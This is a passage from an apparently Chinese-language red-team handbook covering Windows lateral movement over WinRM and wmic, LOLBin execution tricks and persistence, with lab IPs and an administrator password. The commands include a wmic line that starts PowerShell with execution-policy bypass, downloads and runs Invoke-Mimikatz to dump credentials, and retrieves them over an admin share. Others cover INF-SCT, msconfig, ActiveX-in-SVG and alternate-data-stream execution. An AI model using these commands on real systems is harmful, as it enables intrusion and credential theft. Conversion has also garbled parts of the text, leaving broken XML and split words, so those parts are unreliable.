![](media/image126.jpeg){width="4.993680008748907in"
height="3.192707786526684in"}
流量分析：
![](media/image127.jpeg){width="5.771560586176728in" height="3.77625in"}
## WinRM
环境： 攻击机：Windows 2012 R2 （10.100.18.22）安装Python2.7（或者将py
文件打包成exe 格式可以免杀） 被攻击机：Windows 2012 R2 （10.100.18.21）
重点快速预览 首先,先来简单理解下WinRM 是什么 再来大致了解些winRM
的基础利用前提 基于winRM 的手工在远程目标机器上执行任意指令的几种方式
关于msf 中的一些winrm 利用模块的简单应用 如何简单配置当前机器的WinRM
服务首先,就先来简单理解下WinRM 到底是干什么用的 官方说明: WinRM
是Microsoft 对WS-Management 协议的实现,WS-Management
协议即一种基于标准简单对象访问协议\[SOAP\]的 \"防火墙友好\"
协议,它让来自不同供应商的硬件和操作系统能够互相操作 通俗来讲:
只是Windows
下众多可用于远程管理\[执行任意指令\]方式中的其中一种,默认会以服务的形式存在于系统中,既是服务也就意味着,
肯定就会有客户端和服务端,默认winRM 服务端工作在 5985\[http\]或
5986\[https\] 端口上,WinRM 实际上是借助HTTP 协议以SOAP
格式来进行数据交换传输的,这样做的好处在于,HTTP
数据通常情况下对各类防火墙的穿透性相对较好,这也是有别于其它横向手法的地方,更细节的东西先不多说,暂时只需要知道,用它可以在目标内网中帮我们实现快速横向的目的即可,至于其底层在调用哪些东西,如何深层实现,
以及针对这种横向手法怎样进行更彻底的防御,后续有机会咱们再单聊tcp.port==5985
and http.request.method==\"POST\"
> ![](media/image128.jpeg)
![](media/image131.jpeg){width="5.8354101049868765in" height="3.08in"}
![](media/image132.jpeg){width="5.799864391951006in"
height="5.920833333333333in"}
接着,再来大致看下winRM 的一些利用前提条件 首先,winRM 更适用于win7
之后版本的系统\[虽然 03r2
也支持,但确实犯不着这么干,因为关于老系统的其它利用方式非常多\],除win7
外,其它版本的winRM 服务默认就是自启动状态\[只不过是延迟的,5985
端口默认也是对内开放的\],其次注意,在小于 2008r2 的默认配置下,winrm
是没有被配置成允许远程任意主机来管理的\[也就是说,在 2008r2
以下的系统中,默认配置状态下,我们是没法直接拿来横向的,当然,也不排除有些管理员或者同行事先已帮我们配置好\],稍有鸡肋的地方就在这儿,只有在win
2012
之后的版本才默认就直接允许远程任意主机来管理,再者,就是需要目标机器防火墙要放开对tcp
5985
或 5986
端口的连入,最后,还需要有图形界面支持\[因为密码框要用来接收密码,所以得有图形支持才行\]和正确的目标系统管理员的账号及明文密码,总之,一句话概括就是,这种横向方式通常只适用于win2012
之后的系统上,到这里,我想我应该把注意事项差不多都说明白了
被攻击机配置WinRM winrm service
的基础配置，执行之后提示选择的时候选中y： winrm quickconfig 查看winrm
service listener（分为http 和https）: winrm e winrm/config/listener
> 为winrm service 配置auth: winrm set winrm/config/service/auth
> \@{Basic=\"true\"}
>
> 为winrm service 配置加密方式为允许非加密： winrm set
> winrm/config/service \@{AllowUnencrypted=\"true\"}
>
> 查看winrm 服务的配置： winrm get winrm/config
具体配置如下： 运行如下，如果没有返回，则没有开启winrm
> winrm enumerate winrm/config/listener winrm quickconfig
![](media/image133.jpeg){width="5.872904636920385in" height="2.1025in"}
> 配置winrm auth winrm set winrm/config/service/auth "@{Basic="true"}"
![](media/image134.jpeg){width="5.797284558180228in"
height="1.4741655730533683in"}
查看windows 的winrm service listener
![](media/image135.jpeg){width="5.801227034120735in" height="1.9575in"}
> 配置winrm service 加密方式为允许非加密 Winrm set winrm/config/service
> "@{AllowUnencrypted="true"}"
攻击手法： 攻击机：
> import winrm
>
> Win2012 = winrm.Session('10.100.18.21', auth=('administrator',
> '3edc7UJM')) R = Win2012.run_cmd('ipconfig', \['/all'\])
>
> Print R.std_out
![](media/image136.jpeg){width="4.2312434383202095in"
height="4.523748906386702in"}
系统自带winrs
> PS C:\\Users\\Administrator\> winrs -r:10.100.18.21 -u:administrator
> -p:3edc7UJM \"q uery user\"
![](media/image137.jpeg){width="5.82790135608049in"
height="0.8941666666666667in"}
> PS C:\\Users\\Administrator\> winrs -r:10.100.18.21 -u:administrator
> -p:3edc7UJM \"c md\"
![](media/image138.jpeg){width="5.05115813648294in"
height="5.447916666666667in"}
## wmic
环境： 攻击机：Windows 2012 R2 （10.100.18.22） 被攻击机：Windows 2012
R2 （10.100.18.21） 攻击手法：
> wmic /user:\"administrator\" /PASSWORD:\"3edc7UJM\" /NODE:10.100.18.21
> PROCES S CALL CREATE \"PowerShell -exec bypass IEX (New-Object
> Net.WebClient).Downl
> oadString(\'https://raw.githubusercontent.com/mattifestation/PowerSploit/master/E
> xfiltration/Invoke-Mimikatz.ps1\'); Invoke-Mimikatz \| Out-File
> C:\\\\Users\\\\Administra tor\\\\Desktop\\\\wmic.txt\"
远程读取目标主机驻留在内存的凭证 Type
> \\\\10.100.18.21\\c\$\\Users\\Administrator\\Desktop\\wmic.txt
![](media/image139.jpeg){width="6.286363735783027in" height="5.4075in"}
![](media/image140.jpeg){width="5.799515529308836in"
height="5.787916666666667in"}
流量分析：
![](media/image141.jpeg){width="5.801403105861767in"
height="3.709582239720035in"}
## Language LUA in Files .wlua
![](media/image142.jpeg){width="1.008332239720035in"
height="1.0083333333333333in"}
33. **INF-SCT**
> rundll32.exe advpack.dll,LaunchINFSection
> c:\\test.inf,DefaultInstall_SingleUser,1,
![](media/image143.jpeg){width="5.778771872265967in"
height="1.9086450131233597in"}
相关链接 https://twitter.com/bohops/status/967486047839014913
https://gist.githubusercontent.com/bohops/693dd4d5dbfb500f1c3ace02622
d5d34/raw/902ed953a9188b27e91c199b465cddf855c7b94f/test.inf
https://github.com/homjxi0e/AppLockerBPG
## Reflection.Assembly
> PS C:\\Users\\demon\> \$RAS=Join-Path -Path c:\\windows\\system32\\
> -ChildPath calc.exe
>
> PS C:\\Users\\demon\>
> \[Reflection.Assembly\]::LoadWithPartialName(\'Microsoft.Visu
> alBasic\');\[Microsoft.VisualBasic.Interaction\]::Shell(\"\$RAS\",\"0\");
![](media/image144.jpeg){width="5.856264216972878in"
height="3.6710411198600177in"}
## msconfig
> \
>
> \
>
> \ PATH=\"%windir%\\system32\\WindowsPowerShell\\v1.0\\powers hell.exe\"
>
> DEFAULT_OPT=\"-command calc.exe \" HELP=\"LOLBin MSCONFIGTOOLS\"/\>
>
> \
![](media/image145.jpeg){width="5.87918416447944in"
height="3.5795833333333333in"}
1.  讲上述代码 写为mscfgtlc.xml 放置路径为C:\\Windows\\System32
2.  启动CMD ： msconfig -5
1\. 找到LOLBin 一栏 点击启动 触发条件
> https://twitter.com/pabraeken/status/991314564896690177
## sigverif.exe
gui-based-lolbin/
![](media/image146.jpeg){width="2.8054560367454067in"
height="2.43375in"}
## DXCap.exe
> DXCap.exe -c C:\\Windows\\System32\\notepad.exe
https://twitter.com/harr0ey/status/992008180904419328
![](media/image147.jpeg){width="5.790862860892388in"
height="4.786561679790026in"}
## Register-cimprovider.exe ([T1218](https://attack.mitre.org/wiki/Technique/T1218) )
> Register-cimprovider -path \"C:\\folder\\evil.dll\"
https://github.com/api0cradle/LOLBAS/blob/master/OSBinaries/Register-
cimprovider.md
![](media/image148.jpeg){width="4.792398293963255in" height="1.16375in"}
## xls mimikatz
https://gist.github.com/caseysmithrc/b1190e023cd29c1910c01a164675a22e
![](media/image149.jpeg){width="1.008332239720035in"
height="1.0083333333333333in"}
## 40.WMI (T1047)
> ![](media/image150.jpeg){width="5.833333333333333in"
> height="1.6666666666666667in"}wmic process call create "calc.exe"wmic
> process where name="calc.exe" call terminate
\[
![](media/image150.jpeg){width="5.818020559930009in"
height="1.6622911198600174in"}
![](media/image151.jpeg){width="5.865650699912511in"
height="6.390207786526684in"}
https://[www.andreafortuna.org/dfir/windows-command-line-cheatsheet-](http://www.andreafortuna.org/dfir/windows-command-line-cheatsheet-)
part-2-wmic/
## 41.更多花里胡哨的 LOLBIN 内容请参考以下链接
https://gtfobins.github.io/
> https://lolbas-project.github.io/
# 三、[Persistence](https://attack.mitre.org/tactics/TA0003/)
持久化包括攻击者在用户系统重新启动，更改的凭据以及可能切断其访问权限的情况保持对系统的访问权限的技术。用于持久化的技术包括任何访问、操作或更改配置，使攻击者能够在系统上拥有权限，例如替换或劫持合法代码或添加启动脚本。
## 1.Office -SVG (T1137)
1.实际上我们不需要Internet Explorer 来执行ActiveX
2.  我们将使用Microsoft Office 与Microsoft Office
    一起使用浏览器Microsoft Office 通过SVG Document 执行ActiveX
3.注意此方法仅适用于Web 浏览器Microsoft Office 中的SVG Document.
![](media/image152.jpeg){width="4.401727909011374in"
height="5.232811679790026in"}
> \
>
> \\"
> xmlns:xlink=\"\" width=\"600\"
> height=\"600\"\>
>
> \
>
> \
> \
> \
> \
> var r = new ActiveXObject(\"WScript.Shell\").Run(\"calc.exe\");
>
> \]\]\>
>
> \
>
> \ x=\"10\" y=\"10\" /\>
>
> \
![](media/image153.jpeg){width="5.801909448818898in"
height="2.3804166666666666in"}
视频内容
：https://[www.ggsec.cn/SVG-ActiveX.html](http://www.ggsec.cn/SVG-ActiveX.html)
参考资料 ：https://homjxi0e.wordpress.com/2018/08/26/svg-document-
activex-alongside-microsoft-word-execution/
https://gist.githubusercontent.com/homjxi0e/4a38b2402e77a536a4deb1792
8f9a8b0/raw/332b3fa640bb2fff6c59b38a28eaea39b9ec5df6/x000x02.svg
## ADS 数据流(T1137)
> echo \"empty file\" \> c:\\ADS\\file.txt
>
> makecab c:\\ADS\\procexp.exe c:\\ADS\\procexp.cab extrac32
> C:\\ADS\\procexp.cab c:\\ADS\\file.txt:procexp.exe wmic process call
> create \'\"c:\\ADS\\file.txt:procexp.exe\"\'
![](media/image154.jpeg){width="5.855448381452319in"
height="4.660937226596675in"}